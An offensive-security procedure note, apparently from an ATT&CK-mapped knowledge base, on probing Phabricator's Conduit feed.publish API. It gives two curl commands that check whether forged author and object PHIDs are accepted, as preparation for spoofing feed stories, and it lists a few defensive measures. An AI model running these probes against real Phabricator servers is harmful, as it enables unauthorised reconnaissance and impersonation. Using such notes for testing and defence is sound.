---
id: proc-uuid-1
tags:
  - phabricator
  - conduit-api
  - recon
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-phabricator-feed]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:11.079Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify Phabricator Feed.Publish API Endpoint

## Summary

This procedure involves reconnaissance of the Phabricator Conduit feed.publish API to confirm its parameters and lack of validation, enabling subsequent spoofing attacks.

## Description

In Phabricator, the Conduit API's feed.publish method allows publishing feed stories. By testing with 'type' set to 'PhabricatorTokenGivenFeedStory' and a 'data' JSON payload, attackers can verify acceptance of manipulable fields like 'authorPHID' and 'objectPHID' without proper checks. This is crucial for crafting exploits in authenticated sessions. Expected outcomes include API responses confirming parameter parsing, highlighting the vulnerability predating policy enforcement.

## Requirements

1. Authenticated access to Phabricator Conduit API via token
2. Basic knowledge of JSON-RPC API calls
3. HTTP client like curl for testing

## Defense

Defensive measures and detection strategies:

- Implement input validation on all PHID fields in API endpoints
- Enable policy-based access checks for feed publications
- Monitor API logs for anomalous 'data' payloads or high-volume feed.publish calls

## Objectives

1. Confirm API endpoint functionality and parameter acceptance
2. Identify lack of PHID validation for exploitation planning
3. Gather baseline responses for payload crafting

## Instructions

### Step 1: Test Basic API Call

**Context**: Send a minimal request to verify the endpoint responds to the required 'type' and 'data' structure.

**Command** ([[commands/curl-test-phabricator-feed]]):
```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-self","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-self"}'
```

> This command tests legitimate publication first. Expected output: JSON response with 'result' containing story details if successful, or error if misconfigured.

### Step 2: Probe Parameter Flexibility

**Context**: Experiment with invalid PHIDs to check for validation errors.

**Command** ([[commands/curl-test-phabricator-feed]]):
```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"invalid-phid","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"invalid-phid"}'
```

> Look for acceptance without rejection, indicating bypass potential. Success if no strict validation errors occur.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-phabricator-feed]]

## Tools Used


## Tags

- phabricator
- conduit-api
- recon
